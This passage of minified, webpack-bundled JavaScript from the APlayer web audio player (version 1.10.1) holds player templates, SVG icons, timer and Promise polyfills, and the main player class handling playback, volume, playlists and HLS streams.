class="aplayer-icon aplayer-icon-forward">\n                    ',t+=s.skip,t+='\n                </span>\n                <div class="aplayer-volume-wrap">\n                    <button type="button" class="aplayer-icon aplayer-icon-volume-down">\n                        ',t+=s.volumeDown,t+='\n                    </button>\n                    <div class="aplayer-volume-bar-wrap">\n                        <div class="aplayer-volume-bar">\n                            <div class="aplayer-volume" style="height: 80%; background: ',t+=o(a.theme),t+=';"></div>\n                        </div>\n                    </div>\n                </div>\n                <button type="button" class="aplayer-icon aplayer-icon-order">\n                    ',"list"===a.order?t+=s.orderList:"random"===a.order&&(t+=s.orderRandom),t+='\n                </button>\n                <button type="button" class="aplayer-icon aplayer-icon-loop">\n                    ',"one"===a.loop?t+=s.loopOne:"all"===a.loop?t+=s.loopAll:"none"===a.loop&&(t+=s.loopNone),t+='\n                </button>\n                <button type="button" class="aplayer-icon aplayer-icon-menu">\n                    ',t+=s.menu,t+='\n                </button>\n                <button type="button" class="aplayer-icon aplayer-icon-lrc">\n                    ',t+=s.lrc,t+='\n                </button>\n            </div>\n        </div>\n    </div>\n    <div class="aplayer-notice"></div>\n    <div class="aplayer-miniswitcher"><button class="aplayer-icon">',t+=s.right,t+='</button></div>\n</div>\n<div class="aplayer-list',a.listFolded&&(t+=" aplayer-list-hide"),t+='"',a.listMaxHeight&&(t+=' style="max-height: ',t+=o(a.listMaxHeight),t+='"'),t+=">\n    <ol",a.listMaxHeight&&(t+=' style="max-height: ',t+=o(a.listMaxHeight),t+='"'),t+=">\n        ",l(n(1)(u({theme:a.theme,audio:a.audio,index:1}))),t+="\n    </ol>\n</div>\n"),t}},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),a=o(n(3)),r=o(n(16));function o(e){return e&&e.__esModule?e:{default:e}}var s=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.container=t.container,this.options=t.options,this.randomOrder=t.randomOrder,this.init()}return i(e,[{key:"init",value:function(){var e="";this.options.audio.length&&(e="random"===this.options.order?this.options.audio[this.randomOrder[0]].cover:this.options.audio[0].cover),this.container.innerHTML=(0,r.default)({options:this.options,icons:a.default,cover:e,getObject:function(e){return e}}),this.lrc=this.container.querySelector(".aplayer-lrc-contents"),this.lrcWrap=this.container.querySelector(".aplayer-lrc"),this.ptime=this.container.querySelector(".aplayer-ptime"),this.info=this.container.querySelector(".aplayer-info"),this.time=this.container.querySelector(".aplayer-time"),this.barWrap=this.container.querySelector(".aplayer-bar-wrap"),this.button=this.container.querySelector(".aplayer-button"),this.body=this.container.querySelector(".aplayer-body"),this.list=this.container.querySelector(".aplayer-list"),this.listOl=this.container.querySelector(".aplayer-list ol"),this.listCurs=this.container.querySelectorAll(".aplayer-list-cur"),this.played=this.container.querySelector(".aplayer-played"),this.loaded=this.container.querySelector(".aplayer-loaded"),this.thumb=this.container.querySelector(".aplayer-thumb"),this.volume=this.container.querySelector(".aplayer-volume"),this.volumeBar=this.container.querySelector(".aplayer-volume-bar"),this.volumeButton=this.container.querySelector(".aplayer-time button"),this.volumeBarWrap=this.container.querySelector(".aplayer-volume-bar-wrap"),this.loop=this.container.querySelector(".aplayer-icon-loop"),this.order=this.container.querySelector(".aplayer-icon-order"),this.menu=this.container.querySelector(".aplayer-icon-menu"),this.pic=this.container.querySelector(".aplayer-pic"),this.title=this.container.querySelector(".aplayer-title"),this.author=this.container.querySelector(".aplayer-author"),this.dtime=this.container.querySelector(".aplayer-dtime"),this.notice=this.container.querySelector(".aplayer-notice"),this.miniSwitcher=this.container.querySelector(".aplayer-miniswitcher"),this.skipBackButton=this.container.querySelector(".aplayer-icon-back"),this.skipForwardButton=this.container.querySelector(".aplayer-icon-forward"),this.skipPlayButton=this.container.querySelector(".aplayer-icon-play"),this.lrcButton=this.container.querySelector(".aplayer-icon-lrc")}}]),e}();t.default=s},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t.default=function(e){var t={container:e.element||document.getElementsByClassName("aplayer")[0],mini:e.narrow||e.fixed||!1,fixed:!1,autoplay:!1,mutex:!0,lrcType:e.showlrc||e.lrc||0,preload:"auto",theme:"#b7daff",loop:"all",order:"list",volume:.7,listFolded:e.fixed,listMaxHeight:e.listmaxheight||"250px",audio:e.music||[],storageName:"aplayer-setting"};for(var n in t)t.hasOwnProperty(n)&&!e.hasOwnProperty(n)&&(e[n]=t[n]);return"[object Array]"!==Object.prototype.toString.call(e.audio)&&(e.audio=[e.audio]),e.audio.map(function(e){return e.name=e.name||e.title||"Audio name",e.artist=e.artist||e.author||"Audio artist",e.cover=e.cover||e.pic,e.type=e.type||"normal",e}),e.audio.length<=1&&"one"===e.loop&&(e.loop="all"),e}},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 32 32"><path d="M26.667 5.333h-21.333c-0 0-0.001 0-0.001 0-1.472 0-2.666 1.194-2.666 2.666 0 0 0 0.001 0 0.001v-0 16c0 0 0 0.001 0 0.001 0 1.472 1.194 2.666 2.666 2.666 0 0 0.001 0 0.001 0h21.333c0 0 0.001 0 0.001 0 1.472 0 2.666-1.194 2.666-2.666 0-0 0-0.001 0-0.001v0-16c0-0 0-0.001 0-0.001 0-1.472-1.194-2.666-2.666-2.666-0 0-0.001 0-0.001 0h0zM5.333 16h5.333v2.667h-5.333v-2.667zM18.667 24h-13.333v-2.667h13.333v2.667zM26.667 24h-5.333v-2.667h5.333v2.667zM26.667 18.667h-13.333v-2.667h13.333v2.667z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 32 32"><path d="M25.468 6.947c-0.326-0.172-0.724-0.151-1.030 0.057l-6.438 4.38v-3.553c0-0.371-0.205-0.71-0.532-0.884-0.326-0.172-0.724-0.151-1.030 0.057l-12 8.164c-0.274 0.186-0.438 0.496-0.438 0.827s0.164 0.641 0.438 0.827l12 8.168c0.169 0.115 0.365 0.174 0.562 0.174 0.16 0 0.321-0.038 0.468-0.116 0.327-0.173 0.532-0.514 0.532-0.884v-3.556l6.438 4.382c0.169 0.115 0.365 0.174 0.562 0.174 0.16 0 0.321-0.038 0.468-0.116 0.327-0.173 0.532-0.514 0.532-0.884v-16.333c0-0.371-0.205-0.71-0.532-0.884z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 32 32"><path d="M22 16l-10.105-10.6-1.895 1.987 8.211 8.613-8.211 8.612 1.895 1.988 8.211-8.613z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 32 32"><path d="M4 16c0-6.6 5.4-12 12-12s12 5.4 12 12c0 1.2-0.8 2-2 2s-2-0.8-2-2c0-4.4-3.6-8-8-8s-8 3.6-8 8 3.6 8 8 8c1.2 0 2 0.8 2 2s-0.8 2-2 2c-6.6 0-12-5.4-12-12z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 29 32"><path d="M2.667 7.027l1.707-1.693 22.293 22.293-1.693 1.707-4-4h-11.64v4l-5.333-5.333 5.333-5.333v4h8.973l-8.973-8.973v0.973h-2.667v-3.64l-4-4zM22.667 17.333h2.667v5.573l-2.667-2.667v-2.907zM22.667 6.667v-4l5.333 5.333-5.333 5.333v-4h-10.907l-2.667-2.667h13.573z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 33 32"><path d="M9.333 9.333h13.333v4l5.333-5.333-5.333-5.333v4h-16v8h2.667v-5.333zM22.667 22.667h-13.333v-4l-5.333 5.333 5.333 5.333v-4h16v-8h-2.667v5.333zM17.333 20v-8h-1.333l-2.667 1.333v1.333h2v5.333h2z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 29 32"><path d="M9.333 9.333h13.333v4l5.333-5.333-5.333-5.333v4h-16v8h2.667v-5.333zM22.667 22.667h-13.333v-4l-5.333 5.333 5.333 5.333v-4h16v-8h-2.667v5.333z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 22 32"><path d="M20.8 14.4q0.704 0 1.152 0.48t0.448 1.12-0.48 1.12-1.12 0.48h-19.2q-0.64 0-1.12-0.48t-0.48-1.12 0.448-1.12 1.152-0.48h19.2zM1.6 11.2q-0.64 0-1.12-0.48t-0.48-1.12 0.448-1.12 1.152-0.48h19.2q0.704 0 1.152 0.48t0.448 1.12-0.48 1.12-1.12 0.48h-19.2zM20.8 20.8q0.704 0 1.152 0.48t0.448 1.12-0.48 1.12-1.12 0.48h-19.2q-0.64 0-1.12-0.48t-0.48-1.12 0.448-1.12 1.152-0.48h19.2z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 32 32"><path d="M0.622 18.334h19.54v7.55l11.052-9.412-11.052-9.413v7.549h-19.54v3.725z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 32 32"><path d="M22.667 4l7 6-7 6 7 6-7 6v-4h-3.653l-3.76-3.76 2.827-2.827 2.587 2.587h2v-8h-2l-12 12h-6v-4h4.347l12-12h3.653v-4zM2.667 8h6l3.76 3.76-2.827 2.827-2.587-2.587h-4.347v-4z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 28 32"><path d="M13.728 6.272v19.456q0 0.448-0.352 0.8t-0.8 0.32-0.8-0.32l-5.952-5.952h-4.672q-0.48 0-0.8-0.352t-0.352-0.8v-6.848q0-0.48 0.352-0.8t0.8-0.352h4.672l5.952-5.952q0.32-0.32 0.8-0.32t0.8 0.32 0.352 0.8z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 28 32"><path d="M13.728 6.272v19.456q0 0.448-0.352 0.8t-0.8 0.32-0.8-0.32l-5.952-5.952h-4.672q-0.48 0-0.8-0.352t-0.352-0.8v-6.848q0-0.48 0.352-0.8t0.8-0.352h4.672l5.952-5.952q0.32-0.32 0.8-0.32t0.8 0.32 0.352 0.8zM20.576 16q0 1.344-0.768 2.528t-2.016 1.664q-0.16 0.096-0.448 0.096-0.448 0-0.8-0.32t-0.32-0.832q0-0.384 0.192-0.64t0.544-0.448 0.608-0.384 0.512-0.64 0.192-1.024-0.192-1.024-0.512-0.64-0.608-0.384-0.544-0.448-0.192-0.64q0-0.48 0.32-0.832t0.8-0.32q0.288 0 0.448 0.096 1.248 0.48 2.016 1.664t0.768 2.528z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 28 32"><path d="M13.728 6.272v19.456q0 0.448-0.352 0.8t-0.8 0.32-0.8-0.32l-5.952-5.952h-4.672q-0.48 0-0.8-0.352t-0.352-0.8v-6.848q0-0.48 0.352-0.8t0.8-0.352h4.672l5.952-5.952q0.32-0.32 0.8-0.32t0.8 0.32 0.352 0.8zM20.576 16q0 1.344-0.768 2.528t-2.016 1.664q-0.16 0.096-0.448 0.096-0.448 0-0.8-0.32t-0.32-0.832q0-0.384 0.192-0.64t0.544-0.448 0.608-0.384 0.512-0.64 0.192-1.024-0.192-1.024-0.512-0.64-0.608-0.384-0.544-0.448-0.192-0.64q0-0.48 0.32-0.832t0.8-0.32q0.288 0 0.448 0.096 1.248 0.48 2.016 1.664t0.768 2.528zM25.152 16q0 2.72-1.536 5.056t-4 3.36q-0.256 0.096-0.448 0.096-0.48 0-0.832-0.352t-0.32-0.8q0-0.704 0.672-1.056 1.024-0.512 1.376-0.8 1.312-0.96 2.048-2.4t0.736-3.104-0.736-3.104-2.048-2.4q-0.352-0.288-1.376-0.8-0.672-0.352-0.672-1.056 0-0.448 0.32-0.8t0.8-0.352q0.224 0 0.48 0.096 2.496 1.056 4 3.36t1.536 5.056zM29.728 16q0 4.096-2.272 7.552t-6.048 5.056q-0.224 0.096-0.448 0.096-0.48 0-0.832-0.352t-0.32-0.8q0-0.64 0.704-1.056 0.128-0.064 0.384-0.192t0.416-0.192q0.8-0.448 1.44-0.896 2.208-1.632 3.456-4.064t1.216-5.152-1.216-5.152-3.456-4.064q-0.64-0.448-1.44-0.896-0.128-0.096-0.416-0.192t-0.384-0.192q-0.704-0.416-0.704-1.056 0-0.448 0.32-0.8t0.832-0.352q0.224 0 0.448 0.096 3.776 1.632 6.048 5.056t2.272 7.552z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 17 32"><path d="M14.080 4.8q2.88 0 2.88 2.048v18.24q0 2.112-2.88 2.112t-2.88-2.112v-18.24q0-2.048 2.88-2.048zM2.88 4.8q2.88 0 2.88 2.048v18.24q0 2.112-2.88 2.112t-2.88-2.112v-18.24q0-2.048 2.88-2.048z"></path></svg>'},function(e,t){e.exports='<svg xmlns="http://www.w3.org/2000/svg" version="1.1" viewBox="0 0 16 31"><path d="M15.552 15.168q0.448 0.32 0.448 0.832 0 0.448-0.448 0.768l-13.696 8.512q-0.768 0.512-1.312 0.192t-0.544-1.28v-16.448q0-0.96 0.544-1.28t1.312 0.192z"></path></svg>'},function(e,t,n){"use strict";var i,a,r=e.exports={};function o(){throw new Error("setTimeout has not been defined")}function s(){throw new Error("clearTimeout has not been defined")}function l(e){if(i===setTimeout)return setTimeout(e,0);if((i===o||!i)&&setTimeout)return i=setTimeout,setTimeout(e,0);try{return i(e,0)}catch(t){try{return i.call(null,e,0)}catch(t){return i.call(this,e,0)}}}!function(){try{i="function"==typeof setTimeout?setTimeout:o}catch(e){i=o}try{a="function"==typeof clearTimeout?clearTimeout:s}catch(e){a=s}}();var u,c=[],p=!1,d=-1;function h(){p&&u&&(p=!1,u.length?c=u.concat(c):d=-1,c.length&&y())}function y(){if(!p){var e=l(h);p=!0;for(var t=c.length;t;){for(u=c,c=[];++d<t;)u&&u[d].run();d=-1,t=c.length}u=null,p=!1,function(e){if(a===clearTimeout)return clearTimeout(e);if((a===s||!a)&&clearTimeout)return a=clearTimeout,clearTimeout(e);try{a(e)}catch(t){try{return a.call(null,e)}catch(t){return a.call(this,e)}}}(e)}}function f(e,t){this.fun=e,this.array=t}function v(){}r.nextTick=function(e){var t=new Array(arguments.length-1);if(arguments.length>1)for(var n=1;n<arguments.length;n++)t[n-1]=arguments[n];c.push(new f(e,t)),1!==c.length||p||l(y)},f.prototype.run=function(){this.fun.apply(null,this.array)},r.title="browser",r.browser=!0,r.env={},r.argv=[],r.version="",r.versions={},r.on=v,r.addListener=v,r.once=v,r.off=v,r.removeListener=v,r.removeAllListeners=v,r.emit=v,r.prependListener=v,r.prependOnceListener=v,r.listeners=function(e){return[]},r.binding=function(e){throw new Error("process.binding is not supported")},r.cwd=function(){return"/"},r.chdir=function(e){throw new Error("process.chdir is not supported")},r.umask=function(){return 0}},function(e,t,n){"use strict";(function(e,t){!function(e,n){if(!e.setImmediate){var i,a,r,o,s,l=1,u={},c=!1,p=e.document,d=Object.getPrototypeOf&&Object.getPrototypeOf(e);d=d&&d.setTimeout?d:e,"[object process]"==={}.toString.call(e.process)?i=function(e){t.nextTick(function(){y(e)})}:!function(){if(e.postMessage&&!e.importScripts){var t=!0,n=e.onmessage;return e.onmessage=function(){t=!1},e.postMessage("","*"),e.onmessage=n,t}}()?e.MessageChannel?((r=new MessageChannel).port1.onmessage=function(e){y(e.data)},i=function(e){r.port2.postMessage(e)}):p&&"onreadystatechange"in p.createElement("script")?(a=p.documentElement,i=function(e){var t=p.createElement("script");t.onreadystatechange=function(){y(e),t.onreadystatechange=null,a.removeChild(t),t=null},a.appendChild(t)}):i=function(e){setTimeout(y,0,e)}:(o="setImmediate$"+Math.random()+"$",s=function(t){t.source===e&&"string"==typeof t.data&&0===t.data.indexOf(o)&&y(+t.data.slice(o.length))},e.addEventListener?e.addEventListener("message",s,!1):e.attachEvent("onmessage",s),i=function(t){e.postMessage(o+t,"*")}),d.setImmediate=function(e){"function"!=typeof e&&(e=new Function(""+e));for(var t=new Array(arguments.length-1),n=0;n<t.length;n++)t[n]=arguments[n+1];var a={callback:e,args:t};return u[l]=a,i(l),l++},d.clearImmediate=h}function h(e){delete u[e]}function y(e){if(c)setTimeout(y,0,e);else{var t=u[e];if(t){c=!0;try{!function(e){var t=e.callback,i=e.args;switch(i.length){case 0:t();break;case 1:t(i[0]);break;case 2:t(i[0],i[1]);break;case 3:t(i[0],i[1],i[2]);break;default:t.apply(n,i)}}(t)}finally{h(e),c=!1}}}}}("undefined"==typeof self?void 0===e?void 0:e:self)}).call(this,n(4),n(34))},function(e,t,n){"use strict";var i=Function.prototype.apply;function a(e,t){this._id=e,this._clearFn=t}t.setTimeout=function(){return new a(i.call(setTimeout,window,arguments),clearTimeout)},t.setInterval=function(){return new a(i.call(setInterval,window,arguments),clearInterval)},t.clearTimeout=t.clearInterval=function(e){e&&e.close()},a.prototype.unref=a.prototype.ref=function(){},a.prototype.close=function(){this._clearFn.call(window,this._id)},t.enroll=function(e,t){clearTimeout(e._idleTimeoutId),e._idleTimeout=t},t.unenroll=function(e){clearTimeout(e._idleTimeoutId),e._idleTimeout=-1},t._unrefActive=t.active=function(e){clearTimeout(e._idleTimeoutId);var t=e._idleTimeout;t>=0&&(e._idleTimeoutId=setTimeout(function(){e._onTimeout&&e._onTimeout()},t))},n(35),t.setImmediate=setImmediate,t.clearImmediate=clearImmediate},function(e,t,n){"use strict";(function(t){var n="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},i=setTimeout;function a(){}function r(e){if(!(this instanceof r))throw new TypeError("Promises must be constructed via new");if("function"!=typeof e)throw new TypeError("not a function");this._state=0,this._handled=!1,this._value=void 0,this._deferreds=[],c(e,this)}function o(e,t){for(;3===e._state;)e=e._value;0!==e._state?(e._handled=!0,r._immediateFn(function(){var n=1===e._state?t.onFulfilled:t.onRejected;if(null!==n){var i;try{i=n(e._value)}catch(e){return void l(t.promise,e)}s(t.promise,i)}else(1===e._state?s:l)(t.promise,e._value)})):e._deferreds.push(t)}function s(e,t){try{if(t===e)throw new TypeError("A promise cannot be resolved with itself.");if(t&&("object"===(void 0===t?"undefined":n(t))||"function"==typeof t)){var i=t.then;if(t instanceof r)return e._state=3,e._value=t,void u(e);if("function"==typeof i)return void c((a=i,o=t,function(){a.apply(o,arguments)}),e)}e._state=1,e._value=t,u(e)}catch(t){l(e,t)}var a,o}function l(e,t){e._state=2,e._value=t,u(e)}function u(e){2===e._state&&0===e._deferreds.length&&r._immediateFn(function(){e._handled||r._unhandledRejectionFn(e._value)});for(var t=0,n=e._deferreds.length;t<n;t++)o(e,e._deferreds[t]);e._deferreds=null}function c(e,t){var n=!1;try{e(function(e){n||(n=!0,s(t,e))},function(e){n||(n=!0,l(t,e))})}catch(e){if(n)return;n=!0,l(t,e)}}r.prototype.catch=function(e){return this.then(null,e)},r.prototype.then=function(e,t){var n=new this.constructor(a);return o(this,new function(e,t,n){this.onFulfilled="function"==typeof e?e:null,this.onRejected="function"==typeof t?t:null,this.promise=n}(e,t,n)),n},r.prototype.finally=function(e){var t=this.constructor;return this.then(function(n){return t.resolve(e()).then(function(){return n})},function(n){return t.resolve(e()).then(function(){return t.reject(n)})})},r.all=function(e){return new r(function(t,i){if(!e||void 0===e.length)throw new TypeError("Promise.all accepts an array");var a=Array.prototype.slice.call(e);if(0===a.length)return t([]);var r=a.length;function o(e,s){try{if(s&&("object"===(void 0===s?"undefined":n(s))||"function"==typeof s)){var l=s.then;if("function"==typeof l)return void l.call(s,function(t){o(e,t)},i)}a[e]=s,0==--r&&t(a)}catch(e){i(e)}}for(var s=0;s<a.length;s++)o(s,a[s])})},r.resolve=function(e){return e&&"object"===(void 0===e?"undefined":n(e))&&e.constructor===r?e:new r(function(t){t(e)})},r.reject=function(e){return new r(function(t,n){n(e)})},r.race=function(e){return new r(function(t,n){for(var i=0,a=e.length;i<a;i++)e[i].then(t,n)})},r._immediateFn="function"==typeof t&&function(e){t(e)}||function(e){i(e,0)},r._unhandledRejectionFn=function(e){"undefined"!=typeof console&&console&&console.warn("Possible Unhandled Promise Rejection:",e)},e.exports=r}).call(this,n(36).setImmediate)},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),a=v(n(37)),r=v(n(0)),o=v(n(3)),s=v(n(18)),l=v(n(17)),u=v(n(13)),c=v(n(12)),p=v(n(11)),d=v(n(9)),h=v(n(8)),y=v(n(7)),f=v(n(6));function v(e){return e&&e.__esModule?e:{default:e}}var m=[],g=function(){function e(t){if(function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.options=(0,s.default)(t),this.container=this.options.container,this.paused=!0,this.playedPromise=a.default.resolve(),this.mode="normal",this.randomOrder=r.default.randomOrder(this.options.audio.length),this.container.classList.add("aplayer"),this.options.lrcType&&!this.options.fixed&&this.container.classList.add("aplayer-withlrc"),this.options.audio.length>1&&this.container.classList.add("aplayer-withlist"),r.default.isMobile&&this.container.classList.add("aplayer-mobile"),this.arrow=this.container.offsetWidth<=300,this.arrow&&this.container.classList.add("aplayer-arrow"),this.container=this.options.container,2===this.options.lrcType||!0===this.options.lrcType)for(var n=this.container.getElementsByClassName("aplayer-lrc-content"),i=0;i<n.length;i++)this.options.audio[i]&&(this.options.audio[i].lrc=n[i].innerHTML);this.template=new l.default({container:this.container,options:this.options,randomOrder:this.randomOrder}),this.options.fixed&&(this.container.classList.add("aplayer-fixed"),this.template.body.style.width=this.template.body.offsetWidth-18+"px"),this.options.mini&&(this.setMode("mini"),this.template.info.style.display="block"),this.template.info.offsetWidth<200&&this.template.time.classList.add("aplayer-time-narrow"),this.options.lrcType&&(this.lrc=new p.default({container:this.template.lrc,async:3===this.options.lrcType,player:this})),this.events=new y.default,this.storage=new c.default(this),this.bar=new u.default(this.template),this.controller=new d.default(this),this.timer=new h.default(this),this.list=new f.default(this),this.initAudio(),this.bindEvents(),"random"===this.options.order?this.list.switch(this.randomOrder[0]):this.list.switch(0),this.options.autoplay&&this.play(),m.push(this)}return i(e,[{key:"initAudio",value:function(){var e=this;this.audio=document.createElement("audio"),this.audio.preload=this.options.preload;for(var t=function(t){e.audio.addEventListener(e.events.audioEvents[t],function(n){e.events.trigger(e.events.audioEvents[t],n)})},n=0;n<this.events.audioEvents.length;n++)t(n);this.volume(this.storage.get("volume"),!0)}},{key:"bindEvents",value:function(){var e=this;this.on("play",function(){e.paused&&e.setUIPlaying()}),this.on("pause",function(){e.paused||e.setUIPaused()}),this.on("timeupdate",function(){if(!e.disableTimeupdate){e.bar.set("played",e.audio.currentTime/e.duration,"width"),e.lrc&&e.lrc.update();var t=r.default.secondToTime(e.audio.currentTime);e.template.ptime.innerHTML!==t&&(e.template.ptime.innerHTML=t)}}),this.on("durationchange",function(){1!==e.duration&&(e.template.dtime.innerHTML=r.default.secondToTime(e.duration))}),this.on("progress",function(){var t=e.audio.buffered.length?e.audio.buffered.end(e.audio.buffered.length-1)/e.duration:0;e.bar.set("loaded",t,"width")});var t=void 0;this.on("error",function(){e.list.audios.length>1?(e.notice("An audio error has occurred, player will skip forward in 2 seconds."),t=setTimeout(function(){e.skipForward(),e.paused||e.play()},2e3)):1===e.list.audios.length&&e.notice("An audio error has occurred.")}),this.events.on("listswitch",function(){t&&clearTimeout(t)}),this.on("ended",function(){"none"===e.options.loop?"list"===e.options.order?e.list.index<e.list.audios.length-1?(e.list.switch((e.list.index+1)%e.list.audios.length),e.play()):(e.list.switch((e.list.index+1)%e.list.audios.length),e.pause()):"random"===e.options.order&&(e.randomOrder.indexOf(e.list.index)<e.randomOrder.length-1?(e.list.switch(e.nextIndex()),e.play()):(e.list.switch(e.nextIndex()),e.pause())):"one"===e.options.loop?(e.list.switch(e.list.index),e.play()):"all"===e.options.loop&&(e.skipForward(),e.play())})}},{key:"setAudio",value:function(e){this.hls&&(this.hls.destroy(),this.hls=null);var t=e.type;this.options.customAudioType&&this.options.customAudioType[t]?"[object Function]"===Object.prototype.toString.call(this.options.customAudioType[t])?this.options.customAudioType[t](this.audio,e,this):console.error("Illegal customType: "+t):(t&&"auto"!==t||(t=/m3u8(#|\?|$)/i.exec(e.url)?"hls":"normal"),"hls"===t?Hls.isSupported()?(this.hls=new Hls,this.hls.loadSource(e.url),this.hls.attachMedia(this.audio)):this.audio.canPlayType("application/x-mpegURL")||this.audio.canPlayType("application/vnd.apple.mpegURL")?this.audio.src=e.url:this.notice("Error: HLS is not supported."):"normal"===t&&(this.audio.src=e.url)),this.seek(0),this.paused||this.audio.play()}},{key:"theme",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:this.list.audios[this.list.index].theme||this.options.theme,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:this.list.index;(!(arguments.length>2&&void 0!==arguments[2])||arguments[2])&&this.list.audios[t]&&(this.list.audios[t].theme=e),this.template.listCurs[t]&&(this.template.listCurs[t].style.backgroundColor=e),t===this.list.index&&(this.template.pic.style.backgroundColor=e,this.template.played.style.background=e,this.template.thumb.style.background=e,this.template.volume.style.background=e)}},{key:"seek",value:function(e){e=Math.max(e,0),e=Math.min(e,this.duration),this.audio.currentTime=e,this.bar.set("played",e/this.duration,"width"),this.template.ptime.innerHTML=r.default.secondToTime(e)}},{key:"setUIPlaying",value:function(){var e=this;if(this.paused&&(this.paused=!1,this.template.button.classList.remove("aplayer-play"),this.template.button.classList.add("aplayer-pause"),this.template.button.innerHTML="",setTimeout(function(){e.template.button.innerHTML=o.default.pause},100),this.template.skipPlayButton.innerHTML=o.default.pause),this.timer.enable("loading"),this.options.mutex)for(var t=0;t<m.length;t++)this!==m[t]&&m[t].pause()}},{key:"play",value:function(){var e=this;this.setUIPlaying();var t=this.audio.play();t&&t.catch(function(t){console.warn(t),"NotAllowedError"===t.name&&e.setUIPaused()})}},{key:"setUIPaused",value:function(){var e=this;this.paused||(this.paused=!0,this.template.button.classList.remove("aplayer-pause"),this.template.button.classList.add("aplayer-play"),this.template.button.innerHTML="",setTimeout(function(){e.template.button.innerHTML=o.default.play},100),this.template.skipPlayButton.innerHTML=o.default.play),this.container.classList.remove("aplayer-loading"),this.timer.disable("loading")}},{key:"pause",value:function(){this.setUIPaused(),this.audio.pause()}},{key:"switchVolumeIcon",value:function(){this.volume()>=.95?this.template.volumeButton.innerHTML=o.default.volumeUp:this.volume()>0?this.template.volumeButton.innerHTML=o.default.volumeDown:this.template.volumeButton.innerHTML=o.default.volumeOff}},{key:"volume",value:function(e,t){return e=parseFloat(e),isNaN(e)||(e=Math.max(e,0),e=Math.min(e,1),this.bar.set("volume",e,"height"),t||this.storage.set("volume",e),this.audio.volume=e,this.audio.muted&&(this.audio.muted=!1),this.switchVolumeIcon()),this.audio.muted?0:this.audio.volume}},{key:"on",value:function(e,t){this.events.on(e,t)}},{key:"toggle",value:function(){this.template.button.classList.contains("aplayer-play")?this.play():this.template.button.classList.contains("aplayer-pause")&&this.pause()}},{key:"switchAudio",value:function(e){this.list.switch(e)}},{key:"addAudio",value:function(e){this.list.add(e)}},{key:"removeAudio",value:function(e){this.list.remove(e)}},{key:"destroy",value:function(){m.splice(m.indexOf(this),1),this.pause(),this.container.innerHTML="",this.audio.src="",this.timer.destroy(),this.events.trigger("destroy")}},{key:"setMode",value:function(){var e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"normal";this.mode=e,"mini"===e?this.container.classList.add("aplayer-narrow"):"normal"===e&&this.container.classList.remove("aplayer-narrow")}},{key:"notice",value:function(e){var t=this,n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:2e3,i=arguments.length>2&&void 0!==arguments[2]?arguments[2]:.8;this.template.notice.innerHTML=e,this.template.notice.style.opacity=i,this.noticeTime&&clearTimeout(this.noticeTime),this.events.trigger("noticeshow",{text:e}),n&&(this.noticeTime=setTimeout(function(){t.template.notice.style.opacity=0,t.events.trigger("noticehide")},n))}},{key:"prevIndex",value:function(){if(!(this.list.audios.length>1))return 0;if("list"===this.options.order)return this.list.index-1<0?this.list.audios.length-1:this.list.index-1;if("random"===this.options.order){var e=this.randomOrder.indexOf(this.list.index);return 0===e?this.randomOrder[this.randomOrder.length-1]:this.randomOrder[e-1]}}},{key:"nextIndex",value:function(){if(!(this.list.audios.length>1))return 0;if("list"===this.options.order)return(this.list.index+1)%this.list.audios.length;if("random"===this.options.order){var e=this.randomOrder.indexOf(this.list.index);return e===this.randomOrder.length-1?this.randomOrder[0]:this.randomOrder[e+1]}}},{key:"skipBack",value:function(){this.list.switch(this.prevIndex())}},{key:"skipForward",value:function(){this.list.switch(this.nextIndex())}},{key:"duration",get:function(){return isNaN(this.audio.duration)?0:this.audio.duration}}],[{key:"version",get:function(){return"1.10.1"}}]),e}();t.default=g},,function(e,t,n){},function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),n(40);var 